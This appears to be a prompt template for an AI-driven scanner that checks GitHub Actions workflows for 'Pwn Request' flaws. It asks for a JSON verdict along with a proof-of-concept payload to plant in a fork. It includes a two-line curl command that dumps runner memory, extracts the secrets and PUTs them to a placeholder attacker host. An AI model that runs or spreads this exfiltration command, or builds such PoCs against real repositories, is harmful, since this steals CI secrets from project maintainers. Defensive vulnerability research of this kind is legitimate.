Below you can find a GitHub Action workflow and its risk context. Please help me analyze this workflow to determine if it is vulnerable to a "Pwn Request" (executing attacker-controlled code to extract secrets, e.g., `GITHUB_TOKEN` or other environment variables). 

The attack flow we are looking for is:
1. Outside contributor creates a pull request from a forked repository.
2. The workflow is triggered by a target-based event (like `pull_request_target`).
3. The workflow checks out the untrusted PR head into the workspace.
4. The workflow explicitly or implicitly executes attacker-controlled code from the PR checkout.

**Expliot**
A repository is considered vulnerable if an attacker is able to execute the following code (e.g. a new bash script, existing bash script, Python file, etc.):
```bash
curl -sSf {{memdump_url}} | sudo -E python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' >> /tmp/secrets
curl -X PUT -d @/tmp/secrets {{hookbin_base_url}}/$GITHUB_RUN_ID
```
This sends all secrets and the `GITHUB_RUN_ID` to the attacker's server.

**Vulnerability Prioritization:**
You must prioritize deterministic execution vectors (e.g., Remote Code Execution via workspace pollution) over probabilistic vectors (e.g., AI prompt injection).

**Definition of Execution & Workspace Pollution:**
Consider both explicit and implicit command execution. Mark it vulnerable if this path runs attacker-controlled scripts directly (`npm install`, `make`, etc.). 
CRITICALLY: You must evaluate **workspace pollution**. If a third-party action or CLI tool runs in the context of the checked-out PR workspace, evaluate if that tool automatically parses project-level configuration files (e.g., `.npmrc`, `.nvmrc`, `.claude/settings.json`, linter configs, test runner configs) that support defining custom hooks, plugins, or shell commands. If an action implicitly executes code defined in an attacker-controlled config file, treat it as a high-confidence vulnerability. A checkout of PR code alone is not enough; it must lead to execution.

**Trust Gates:**
If the path requires maintainer action, a trusted org/member check, a "safe-to-test" label, a merged/closed PR condition, or any similar trust gate BEFORE PR code execution, treat it as safe. However, "safe-to-test" label approaches are only safe if the label gets removed for every new workflow run/commit. Also, check whether `permissions` reduce the `GITHUB_TOKEN` scope enough to block meaningful impact. If the workflow checks out trusted base-repository code for the build and only checks out PR code into a separate path for inspection (without running tools against it that parse executing configs), treat it as safe. Focus only on the execution path described in `Risk context.path`.

---

**Mandatory Analysis Steps (Do this BEFORE outputting the JSON):**
1. **Identify Actors:** List every third-party Action, CLI tool, or script that executes *after* the untrusted PR code is checked out in the execution path.
2. **Mandatory Configuration Search:** For every tool identified in Step 1, you don't know, you should use your web search capabilities to find its official documentation regarding "configuration files," "settings," "hooks," "plugins," or "lifecycle scripts."
3. **Evaluate Pollution:** Explicitly state whether each tool automatically parses project-level files from the current working directory, and if those files can execute arbitrary commands.

After completing the mandatory analysis steps, provide your final answer in strictly valid JSON format exactly matching the structure below:

```json
{
  "vulnerable": true,
  "confidence": "high",
  "explanation": "State the tool used. State the exact filename it parses from the workspace. State the exact event or command that triggers the execution of the payload within that file. If no workspace pollution exists, explain why the explicit execution or fallback vector works (or why it is safe).",
  "impact": "What can be achieved by exploiting this vulnerability (e.g., RCE, exfiltration of secrets via network or PR comment).",
  "poc": "Provide a minimal, executable PoC payload (do not use markdown code fences for the PoC string) that I can place in a fork of the repository to confirm the vulnerability."
}

The confidence value must be exactly one of: very low, low, medium, high, very high. If you are not sure, treat it as vulnerable to avoid false negatives.

Risk context:
{{risk_context_json}}